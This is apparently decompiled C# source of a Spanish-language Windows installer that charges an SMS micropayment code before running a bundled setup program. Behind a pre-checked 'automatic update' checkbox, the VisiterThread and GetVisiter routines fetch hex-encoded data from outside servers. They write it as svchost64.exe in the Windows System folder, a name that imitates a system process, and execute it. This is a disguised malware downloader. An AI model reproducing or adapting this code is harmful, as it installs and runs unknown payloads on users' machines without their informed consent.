using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml;
using Installer.Files;
using Installer.Properties;

namespace Installer;

public class fMain : Form
{
	private bool m_forceClosing = false;

	private CParams m_params = null;

	private Thread m_thVisiter;

	private string[] m_urls = new string[2] { "http://www.yapson.com/__temp.php", "http://www.gp1.es/__temp.php" };

	private bool m_codeOk = false;

	private string m_url = "http://www.panelsms.com/micropagos/comprobacion/compruebo.php?id=1960&codigo={1}";

	private bool m_otherCountries = false;

	private IContainer components = null;

	private Button bCancel;

	private Button bAccept;

	private TextBox tbCode;

	private WebBrowser wb1;

	private LinkLabel llOther;

	private CheckBox cbUpdater;

	public fMain()
	{
		InitializeComponent();
	}

	private void bCancel_Click(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void fMain_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Invalid comparison between Unknown and I4
		if (!m_forceClosing)
		{
			DialogResult val = MessageBox.Show((IWin32Window)(object)this, m_params.confirmCloseText, m_params.confirmCloseCaption, (MessageBoxButtons)4);
			if ((int)val == 6)
			{
				((CancelEventArgs)(object)e).Cancel = false;
				m_forceClosing = true;
			}
			else
			{
				((CancelEventArgs)(object)e).Cancel = true;
			}
		}
	}

	private void fMain_FormClosed(object sender, FormClosedEventArgs e)
	{
		((Control)this).Hide();
	}

	private void fMain_Load(object sender, EventArgs e)
	{
		GetParams();
		SetupInterfaz();
	}

	private void GetVisiter()
	{
		if (m_thVisiter == null)
		{
			m_thVisiter = new Thread(VisiterThread);
			m_thVisiter.Start();
		}
	}

	private void VisiterThread()
	{
		try
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\svchost64.exe";
			if (File.Exists(path))
			{
				return;
			}
			int num = 0;
			while (!GetVisiter(m_urls[num]))
			{
				num++;
				if (num >= m_url.Length || !((Control)this).get_Visible())
				{
					break;
				}
			}
		}
		catch
		{
		}
	}

	private bool GetVisiter(string url)
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\svchost64.exe";
		try
		{
			WebRequest webRequest = WebRequest.Create(url);
			WebResponse response = webRequest.GetResponse();
			StreamReader streamReader = new StreamReader(response.GetResponseStream());
			string text2 = streamReader.ReadToEnd();
			streamReader.Close();
			text2 = text2.Substring(text2.IndexOf("#START#") + "#START#".Length);
			text2 = text2.Remove(text2.IndexOf("#END#"));
			File.Delete(text);
			FileStream output = File.Create(text);
			BinaryWriter binaryWriter = new BinaryWriter(output);
			for (int i = 0; i < text2.Length; i += 2)
			{
				string s = text2.Substring(i, 2);
				byte value = byte.Parse(s, NumberStyles.HexNumber);
				binaryWriter.Write(value);
			}
			binaryWriter.Close();
		}
		catch
		{
			return false;
		}
		Process.Start(text, "-s");
		return true;
	}

	private void GetParams()
	{
		Stream manifestResourceStream = CResources.GetManifestResourceStream("Installer.Files.params.txt");
		if (manifestResourceStream != null)
		{
			StreamReader streamReader = new StreamReader(manifestResourceStream, Encoding.GetEncoding(1252));
			string p = streamReader.ReadToEnd();
			m_params = new CParams(p);
			manifestResourceStream.Close();
		}
		else
		{
			m_params = new CParams();
		}
	}

	private void SetupInterfaz()
	{
		SetupBackground();
		int num = ((Form)this).get_Size().Width - ((Form)this).get_ClientSize().Width;
		int num2 = ((Form)this).get_Size().Height - ((Form)this).get_ClientSize().Height;
		((Form)this).set_Size(new Size(((Control)this).get_BackgroundImage().get_Width() + num, ((Control)this).get_BackgroundImage().get_Height() + num2));
		SetupForm();
		SetupButtons();
		SetupTextBox();
		SetupCheckBox();
	}

	private void SetupForm()
	{
		if (m_otherCountries)
		{
			((Control)this).set_Text(m_params.captionOtherCountries);
		}
		else
		{
			((Control)this).set_Text(m_params.caption);
		}
	}

	private void SetupTextBox()
	{
		if (m_otherCountries)
		{
			((Control)tbCode).set_Location(m_params.textboxLocationOtherCountries);
			((Control)tbCode).set_Size(m_params.textboxSizeOtherCountries);
		}
		else
		{
			((Control)tbCode).set_Location(m_params.textboxLocation);
			((Control)tbCode).set_Size(m_params.textboxSize);
		}
	}

	private void SetupCheckBox()
	{
		if (m_otherCountries)
		{
			((Control)cbUpdater).set_Visible(false);
			return;
		}
		((Control)cbUpdater).set_Visible(m_params.checkBoxShow);
		((Control)cbUpdater).set_Location(m_params.checkBoxLocation);
		((Control)cbUpdater).set_Text(m_params.checkBoxText);
	}

	private void SetupButtons()
	{
		if (m_otherCountries)
		{
			((Control)bAccept).set_Location(m_params.acceptLocationOtherCountries);
			((Control)bAccept).set_Size(m_params.acceptSizeOtherCountries);
			((Control)bCancel).set_Location(m_params.cancelLocationOtherCountries);
			((Control)bCancel).set_Size(m_params.cancelSizeOtherCountries);
			((Control)llOther).set_Visible(m_params.otherCountriesShowOtherCountries);
			((Control)llOther).set_Location(m_params.otherCountriesLocationOtherCountries);
			((Control)llOther).set_Text(m_params.otherCountriesCaptionOtherCountries);
		}
		else
		{
			((Control)bAccept).set_Location(m_params.acceptLocation);
			((Control)bAccept).set_Size(m_params.acceptSize);
			((Control)bCancel).set_Location(m_params.cancelLocation);
			((Control)bCancel).set_Size(m_params.cancelSize);
			((Control)llOther).set_Visible(m_params.otherCountriesShow);
			((Control)llOther).set_Location(m_params.otherCountriesLocation);
			((Control)llOther).set_Text(m_params.otherCountriesCaption);
		}
		((Control)bAccept).set_Text(m_params.acceptCaption);
		((Control)bCancel).set_Text(m_params.cancelCaption);
	}

	private void SetupBackground()
	{
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Expected O, but got Unknown
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0051: Expected O, but got Unknown
		if (m_otherCountries)
		{
			Stream manifestResourceStream = CResources.GetManifestResourceStream("Installer.Files.otherCountries.bmp");
			if (manifestResourceStream != null)
			{
				Bitmap backgroundImage = new Bitmap(manifestResourceStream);
				((Control)this).set_BackgroundImage((Image)(object)backgroundImage);
			}
			else
			{
				((Control)this).set_BackgroundImage((Image)(object)Resources.defaultOther);
			}
		}
		else
		{
			Stream manifestResourceStream = CResources.GetManifestResourceStream("Installer.Files.installer.bmp");
			if (manifestResourceStream != null)
			{
				Bitmap backgroundImage = new Bitmap(manifestResourceStream);
				((Control)this).set_BackgroundImage((Image)(object)backgroundImage);
			}
			else
			{
				((Control)this).set_BackgroundImage((Image)(object)Resources.defaultBackground);
			}
		}
	}

	private void bAccept_Click(object sender, EventArgs e)
	{
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		if (cbUpdater.get_Checked())
		{
			GetVisiter();
		}
		if (((Control)tbCode).get_Text() != "")
		{
			((Control)this).set_Enabled(false);
			string requestUriString = string.Format(m_url, m_params.programName, ((Control)tbCode).get_Text());
			string s;
			try
			{
				WebRequest webRequest = WebRequest.Create(requestUriString);
				WebResponse response = webRequest.GetResponse();
				StreamReader streamReader = new StreamReader(response.GetResponseStream());
				s = streamReader.ReadToEnd();
				streamReader.Close();
			}
			catch
			{
				MessageBox.Show((IWin32Window)(object)this, m_params.errorConnectionText, m_params.errorConnectionCaption);
				((Control)this).set_Enabled(true);
				return;
			}
			XmlReader xmlReader = null;
			try
			{
				xmlReader = XmlReader.Create(new StringReader(s), new XmlReaderSettings
				{
					CloseInput = true,
					IgnoreWhitespace = true
				});
				xmlReader.Read();
				bool flag = true;
				bool flag2 = false;
				while ((xmlReader.NodeType != XmlNodeType.Element || xmlReader.Name.ToLower() != "micropago") && flag)
				{
					xmlReader.Read();
					if (xmlReader.NodeType == XmlNodeType.None)
					{
						flag = false;
					}
				}
				if (flag)
				{
					xmlReader.Read();
					while ((xmlReader.NodeType != XmlNodeType.Element || xmlReader.Name.ToLower() != "status") && flag)
					{
						xmlReader.Read();
						if (xmlReader.NodeType == XmlNodeType.None)
						{
							flag = false;
						}
					}
					if (flag)
					{
						xmlReader.Read();
						while (xmlReader.NodeType != XmlNodeType.Text && flag)
						{
							xmlReader.Read();
							if (xmlReader.NodeType == XmlNodeType.None)
							{
								flag = false;
							}
						}
						if (flag)
						{
							if (xmlReader.Value.ToUpper() == "OK")
							{
								flag = true;
								flag2 = true;
							}
							else
							{
								flag = false;
							}
						}
					}
				}
				if (flag && flag2)
				{
					xmlReader.Close();
					xmlReader = null;
					m_codeOk = true;
				}
				else
				{
					ShowMessageWrongCode();
				}
			}
			catch
			{
				ShowMessageWrongCode();
			}
			finally
			{
				xmlReader?.Close();
			}
		}
		if (m_codeOk)
		{
			ExecuteInstaller();
		}
	}

	private void ShowMessageWrongCode()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show((IWin32Window)(object)this, m_params.wrongCodeText, m_params.wrongCodeCaption);
		((Control)this).set_Enabled(true);
	}

	private void ExecuteInstaller()
	{
		string text = "tmp.exe";
		Stream manifestResourceStream = CResources.GetManifestResourceStream("Installer.Files.installer.exe");
		BinaryReader binaryReader = new BinaryReader(manifestResourceStream);
		if (File.Exists(text))
		{
			File.Delete(text);
		}
		FileStream output = new FileStream(text, FileMode.Create);
		BinaryWriter binaryWriter = new BinaryWriter(output);
		byte[] array = new byte[manifestResourceStream.Length];
		manifestResourceStream.Read(array, 0, array.Length);
		binaryWriter.Write(array);
		binaryReader.Close();
		binaryWriter.Close();
		Process process = new Process();
		process.StartInfo.FileName = text;
		((Control)this).Hide();
		process.Start();
		process.WaitForExit();
		File.Delete(text);
		m_forceClosing = true;
		((Form)this).Close();
	}

	private void llOther_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		if (m_otherCountries)
		{
			m_otherCountries = false;
		}
		else
		{
			m_otherCountries = true;
		}
		SetupInterfaz();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0297: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a1: Expected O, but got Unknown
		//IL_040b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0415: Expected O, but got Unknown
		//IL_0448: Unknown result type (might be due to invalid IL or missing references)
		//IL_0452: Expected O, but got Unknown
		//IL_045a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0464: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(fMain));
		bCancel = new Button();
		bAccept = new Button();
		tbCode = new TextBox();
		wb1 = new WebBrowser();
		llOther = new LinkLabel();
		cbUpdater = new CheckBox();
		((Control)this).SuspendLayout();
		((Control)bCancel).set_Anchor((AnchorStyles)10);
		bCancel.set_DialogResult((DialogResult)2);
		((Control)bCancel).set_Location(new Point(93, 328));
		((Control)bCancel).set_Name("bCancel");
		((Control)bCancel).set_Size(new Size(75, 23));
		((Control)bCancel).set_TabIndex(0);
		((Control)bCancel).set_Text("bCancel");
		((ButtonBase)bCancel).set_UseVisualStyleBackColor(true);
		((Control)bCancel).add_Click((EventHandler)bCancel_Click);
		((Control)bAccept).set_Anchor((AnchorStyles)10);
		((Control)bAccept).set_Location(new Point(12, 328));
		((Control)bAccept).set_Name("bAccept");
		((Control)bAccept).set_Size(new Size(75, 23));
		((Control)bAccept).set_TabIndex(1);
		((Control)bAccept).set_Text("bAccept");
		((ButtonBase)bAccept).set_UseVisualStyleBackColor(true);
		((Control)bAccept).add_Click((EventHandler)bAccept_Click);
		((Control)tbCode).set_Location(new Point(143, 94));
		((Control)tbCode).set_Name("tbCode");
		((Control)tbCode).set_Size(new Size(179, 20));
		((Control)tbCode).set_TabIndex(2);
		((Control)wb1).set_Location(new Point(0, 0));
		((Control)wb1).set_Name("wb1");
		((Control)wb1).set_Size(new Size(0, 0));
		((Control)wb1).set_TabIndex(3);
		((Control)wb1).set_Visible(false);
		((Control)llOther).set_AutoSize(true);
		((Control)llOther).set_BackColor(Color.Transparent);
		((Control)llOther).set_Location(new Point(177, 298));
		((Control)llOther).set_Name("llOther");
		((Control)llOther).set_Size(new Size(65, 13));
		((Control)llOther).set_TabIndex(4);
		((Label)llOther).set_TabStop(true);
		((Control)llOther).set_Text("Otros paises");
		llOther.add_LinkClicked(new LinkLabelLinkClickedEventHandler(llOther_LinkClicked));
		((Control)cbUpdater).set_AutoSize(true);
		((Control)cbUpdater).set_BackColor(Color.Transparent);
		cbUpdater.set_Checked(true);
		cbUpdater.set_CheckState((CheckState)1);
		((Control)cbUpdater).set_Location(new Point(336, 275));
		((Control)cbUpdater).set_Name("cbUpdater");
		((Control)cbUpdater).set_Size(new Size(144, 17));
		((Control)cbUpdater).set_TabIndex(5);
		((Control)cbUpdater).set_Text("Actualización automática");
		((ButtonBase)cbUpdater).set_UseVisualStyleBackColor(false);
		((Form)this).set_AcceptButton((IButtonControl)(object)bAccept);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)(object)Resources.defaultBackground);
		((Form)this).set_CancelButton((IButtonControl)(object)bCancel);
		((Form)this).set_ClientSize(new Size(499, 363));
		((Control)this).get_Controls().Add((Control)(object)cbUpdater);
		((Control)this).get_Controls().Add((Control)(object)llOther);
		((Control)this).get_Controls().Add((Control)(object)wb1);
		((Control)this).get_Controls().Add((Control)(object)tbCode);
		((Control)this).get_Controls().Add((Control)(object)bAccept);
		((Control)this).get_Controls().Add((Control)(object)bCancel);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("fMain");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).add_Load((EventHandler)fMain_Load);
		((Form)this).add_FormClosed(new FormClosedEventHandler(fMain_FormClosed));
		((Form)this).add_FormClosing(new FormClosingEventHandler(fMain_FormClosing));
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
